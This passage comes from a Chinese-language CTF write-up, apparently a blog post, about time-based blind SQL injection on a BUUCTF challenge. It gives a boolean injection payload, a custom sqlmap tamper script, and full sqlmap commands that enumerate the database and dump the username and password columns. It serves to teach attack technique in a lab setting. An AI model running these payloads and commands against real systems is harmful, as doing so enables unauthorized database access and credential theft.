&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;id=\0&amp;amp;path= or 1=1 %23
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;更改or后面的值可以更改payload。由于网页正确时会返回图片，我们使用布尔盲注或者时间盲注都可以。&lt;/p&gt;
&lt;p&gt;下面演示一下使用sqlmap该怎么对这道题进行时间盲注：&lt;/p&gt;
&lt;p&gt;首先是tamper脚本的编写：&lt;/p&gt;
&lt;p&gt;在sqlmap/tamper/里新建自己中意名字的python脚本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#dc322f;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;sys&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;sys&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;path&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;append&lt;/span&gt;(&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;E:&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;tools&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;sqlmap&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#dc322f;font-weight:bold&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;lib.core.enums&lt;/span&gt; &lt;span style=&#34;color:#dc322f;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;PRIORITY&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#dc322f;font-weight:bold&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;lib.core.common&lt;/span&gt; &lt;span style=&#34;color:#dc322f;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;singleTimeWarnMessage&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;__priority__&lt;/span&gt; = &lt;span style=&#34;color:#268bd2&#34;&gt;PRIORITY&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;LOW&lt;/span&gt; &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;# 当前脚本调用优先等级&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#859900&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;dependencies&lt;/span&gt;(): &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;# 声明当前脚本适用/不适用的范围，可以为空。&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#268bd2&#34;&gt;singleTimeWarnMessage&lt;/span&gt;(&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;这是我的tamper提示&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#859900&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;tamper&lt;/span&gt;(&lt;span style=&#34;color:#268bd2&#34;&gt;payload&lt;/span&gt;, **&lt;span style=&#34;color:#268bd2&#34;&gt;kwargs&lt;/span&gt;): &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;# 用于篡改Payload、以及请求头的主要函数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#268bd2&#34;&gt;payload&lt;/span&gt; = &lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34; or &amp;#34;&lt;/span&gt;+&lt;span style=&#34;color:#268bd2&#34;&gt;payload&lt;/span&gt;+&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;%23&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#859900&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;payload&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一个最小的tamper脚本结构为priority变量定义和dependencies、tamper函数定义，&lt;/p&gt;
&lt;p&gt;priority定义脚本的优先级，用于有多个tamper脚本的情况，查看lib.core.enums里的PRIORITY类可以看到详细的定义级别：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#859900&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#cb4b16&#34;&gt;PRIORITY&lt;/span&gt;(&lt;span style=&#34;color:#cb4b16&#34;&gt;object&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#268bd2&#34;&gt;LOWEST&lt;/span&gt; = -&lt;span style=&#34;color:#2aa198;font-weight:bold&#34;&gt;100&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#268bd2&#34;&gt;LOWER&lt;/span&gt; = -&lt;span style=&#34;color:#2aa198;font-weight:bold&#34;&gt;50&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#268bd2&#34;&gt;LOW&lt;/span&gt; = -&lt;span style=&#34;color:#2aa198;font-weight:bold&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#268bd2&#34;&gt;NORMAL&lt;/span&gt; = &lt;span style=&#34;color:#2aa198;font-weight:bold&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#268bd2&#34;&gt;HIGH&lt;/span&gt; = &lt;span style=&#34;color:#2aa198;font-weight:bold&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#268bd2&#34;&gt;HIGHER&lt;/span&gt; = &lt;span style=&#34;color:#2aa198;font-weight:bold&#34;&gt;50&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#268bd2&#34;&gt;HIGHEST&lt;/span&gt; = &lt;span style=&#34;color:#2aa198;font-weight:bold&#34;&gt;100&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;dependencies函数声明该脚本适用/不适用的范围，可以为空；&lt;/p&gt;
&lt;p&gt;刚才例子里使用的&lt;code&gt;singleTimeWarnMessage() &lt;/code&gt;用于在控制台中打印出警告信息：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/627261fc09475431295dc61e.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/627261fc09475431295dc61e.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;tamper是主要的函数，接受的参数为payload和**kwargs，其中payload就是所求。kwargs为相关httpheader，想插入或则修改header的时候可以用到。&lt;/p&gt;
&lt;p&gt;如例，我的tamper里就可以这么前后一加（虽然在sqlmap里也有类似的指令），然后url变成&lt;code&gt;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=&lt;/code&gt;，再指定注入参数为path就可以了。&lt;/p&gt;
&lt;p&gt;下面是要用到的注入命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--&lt;span style=&#34;color:#268bd2&#34;&gt;current&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;db&lt;/span&gt; &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;#查看当前的数据库&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--&lt;span style=&#34;color:#268bd2&#34;&gt;technique&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;T&lt;/span&gt;  &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;#指定注入类型&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　&lt;span style=&#34;color:#268bd2&#34;&gt;B&lt;/span&gt;: &lt;span style=&#34;color:#268bd2&#34;&gt;Boolean&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;based&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;blind&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;SQL&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;injection&lt;/span&gt;（布尔型注入）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　&lt;span style=&#34;color:#268bd2&#34;&gt;E&lt;/span&gt;: &lt;span style=&#34;color:#268bd2&#34;&gt;Error&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;based&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;SQL&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;injection&lt;/span&gt;（报错型注入）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　&lt;span style=&#34;color:#268bd2&#34;&gt;U&lt;/span&gt;: &lt;span style=&#34;color:#268bd2&#34;&gt;UNION&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;query&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;SQL&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;injection&lt;/span&gt;（可联合查询注入）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　&lt;span style=&#34;color:#268bd2&#34;&gt;S&lt;/span&gt;: &lt;span style=&#34;color:#268bd2&#34;&gt;Stacked&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;queries&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;SQL&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;injection&lt;/span&gt;（可多语句查询注入）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　&lt;span style=&#34;color:#268bd2&#34;&gt;T&lt;/span&gt;: &lt;span style=&#34;color:#268bd2&#34;&gt;Time&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;based&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;blind&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;SQL&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;injection&lt;/span&gt;（基于时间延迟注入）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;v3&lt;/span&gt;  &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;#输出详细度 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#2aa198;font-weight:bold&#34;&gt;0&lt;/span&gt;、只显示&lt;span style=&#34;color:#268bd2&#34;&gt;python错误以及严重的信息&lt;/span&gt;。
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#2aa198;font-weight:bold&#34;&gt;1&lt;/span&gt;、同时显示基本信息和警告信息。（默认）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#2aa198;font-weight:bold&#34;&gt;2&lt;/span&gt;、同时显示&lt;span style=&#34;color:#268bd2&#34;&gt;debug信息&lt;/span&gt;。
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#2aa198;font-weight:bold&#34;&gt;3&lt;/span&gt;、同时显示注入的&lt;span style=&#34;color:#268bd2&#34;&gt;payload&lt;/span&gt;。
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#2aa198;font-weight:bold&#34;&gt;4&lt;/span&gt;、同时显示&lt;span style=&#34;color:#268bd2&#34;&gt;HTTP请求&lt;/span&gt;。
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#2aa198;font-weight:bold&#34;&gt;5&lt;/span&gt;、同时显示&lt;span style=&#34;color:#268bd2&#34;&gt;HTTP响应头&lt;/span&gt;。
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#2aa198;font-weight:bold&#34;&gt;6&lt;/span&gt;、同时显示&lt;span style=&#34;color:#268bd2&#34;&gt;HTTP响应页面&lt;/span&gt;。
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--&lt;span style=&#34;color:#268bd2&#34;&gt;threads&lt;/span&gt; &lt;span style=&#34;color:#2aa198;font-weight:bold&#34;&gt;5&lt;/span&gt;           &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;#指定线程数(时间盲注不推荐开多线程)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--&lt;span style=&#34;color:#268bd2&#34;&gt;dbms&lt;/span&gt;=&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;MySQL&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;#指定其数据库为mysql &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;其他数据库：&lt;span style=&#34;color:#268bd2&#34;&gt;Altibase&lt;/span&gt;,&lt;span style=&#34;color:#268bd2&#34;&gt;Apache&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;Derby&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;CrateDB&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;Cubrid&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;Firebird&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;FrontBase&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;H2&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;HSQLDB&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;IBM&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;DB2&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;Informix&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;InterSystems&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;Cache&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;Mckoi&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;Microsoft&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;Access&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;Microsoft&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;SQL&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;Server&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;MimerSQL&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;MonetDB&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;MySQL&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;Oracle&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;PostgreSQL&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;Presto&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;SAP&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;MaxDB&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;SQLite&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;Sybase&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;Vertica&lt;/span&gt;, &lt;span style=&#34;color:#268bd2&#34;&gt;eXtremeDB&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--&lt;span style=&#34;color:#268bd2&#34;&gt;time&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;sec&lt;/span&gt; &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;#DBMS响应的延迟时间（默认为5秒）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;p&lt;/span&gt;     &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;#可测试的参数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--&lt;span style=&#34;color:#268bd2&#34;&gt;fresh&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;queries&lt;/span&gt;     &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;#刷新缓存&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;库名&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 sqlmap.py -u &amp;#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=1&amp;#34; --tamper=my.py -v 3 --dbms=&amp;#34;MySQL&amp;#34; --technique=T -p path  --time-sec 4 --current-db
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/62725e58094754312955451b.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/62725e58094754312955451b.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;表名&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 sqlmap.py -u &amp;#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=1&amp;#34; --tamper=my.py -v 3 --dbms=&amp;#34;MySQL&amp;#34; --technique=T -p path  --time-sec 4 -D ciscnfinal --tables
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6272607009475431295a3797.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6272607009475431295a3797.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;字段(sqlmap自动用了16进制的绕过)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 sqlmap.py -u &amp;#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=1&amp;#34; --tamper=my.py -v 3 --dbms=&amp;#34;MySQL&amp;#34; --technique=T -p path   --time-sec 4 -D ciscnfinal -T users --columns
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/627262bf09475431295f9d8d.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/627262bf09475431295f9d8d.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;数据&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 sqlmap.py -u &amp;#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=1&amp;#34; --tamper=my.py -v 3 --dbms=&amp;#34;MySQL&amp;#34; --technique=T -p path   --time-sec 4 -D ciscnfinal -T users -C username,password --dump
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6272692e09475431296f1258.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6272692e09475431296f1258.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里b2ff3D048fe0c0374fd7可耻的错了，刷新缓存之后是b2ff30048fe0c0374fd7，看来时间盲注还是错误率的hhh。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/62726b99094754312974d9ee.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/62726b99094754312974d9ee.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里能发现，sqlmap每次盲注的最后都使用一个&lt;code&gt;非&lt;/code&gt;来确定时间盲注的判断是否成功，下面接上刷新缓存的命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 sqlmap.py -u &amp;#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=1&amp;#34; --tamper=my.py -v 3 --dbms=&amp;#34;MySQL&amp;#34; --technique=T -p path   --time-sec 4 -D ciscnfinal -T users -C username,password --dump --fresh-queries
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;完成注入，可以登录了，结束。但是这里还有很多问题，比如level还没涉及到，比如知道误报之后怎么只刷新特定的缓存……&lt;/p&gt;
&lt;p&gt;推荐一个SQLMAP进阶使用的博客：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://drops.xmd5.com/static/drops/tips-5254.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://drops.xmd5.com/static/drops/tips-5254.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下面是一些好玩的注入命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--&lt;span style=&#34;color:#268bd2&#34;&gt;referer&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;http&lt;/span&gt;://&lt;span style=&#34;color:#268bd2&#34;&gt;www&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;baidu&lt;/span&gt;.&lt;span style=&#34;color:#268bd2&#34;&gt;com&lt;/span&gt;   &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;#伪造referer字段&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--&lt;span style=&#34;color:#268bd2&#34;&gt;is&lt;/span&gt;-&lt;span style=&#34;color:#268bd2&#34;&gt;dba&lt;/span&gt;    &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;#判断当前用户是否有管理员权限&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--&lt;span style=&#34;color:#268bd2&#34;&gt;data&lt;/span&gt;=&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;uname=admin&amp;amp;passwd=admin&amp;amp;submit=Submit&amp;#34;&lt;/span&gt;  &lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;#抓取其post提交的数据填入&lt;/span&gt;
